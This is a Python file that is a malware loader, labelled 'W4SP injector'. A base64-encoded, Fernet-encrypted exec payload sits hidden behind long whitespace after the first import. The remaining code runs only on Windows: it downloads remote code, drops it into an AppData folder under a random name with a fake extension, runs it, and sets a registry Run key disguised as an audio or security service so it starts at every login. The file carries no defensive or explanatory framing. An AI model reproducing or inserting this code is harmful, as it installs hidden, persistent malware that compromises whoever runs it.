import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1FZY3F5cmtjU24tZUlhWkhtYXVQMWZtV0p4dnRmVkhkd05oNmtORi0xSXc9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjV6aVBYcW5kNFI5OFloV0hmU2Fxemg2TS12UWhGdzUtR1Rzc29tZWEzdUlUNHFkZWhVZkhSaTIwX3dMVHh2Sk1hMlFGRmlITnpid3dVTzVwbHp1eWRzV0xhR3pPdWJmZEE2NVo0NTZWU0hBNGloNWZhdzgxOTVIS2ZPamxMSnM4a2xUZXlvQ215aDM5c2l4NXpSQXBDR0hPcFRsOU5Sb0Itb2FJZERvM1c3UVU2M0ZIVHBwOThTbXlPOGpzTG9MdTNEUk1DeWVtVFlWQmtYbFVJdnhGcTV3Y0MzSFhIUVY0bEtrX1hpQWtWRE5MN2c9Jykp').decode())
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

import contextlib
DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
with contextlib.suppress(Exception):
    startUP(DoYouKnowTheWay)
print('pkfjllzyn')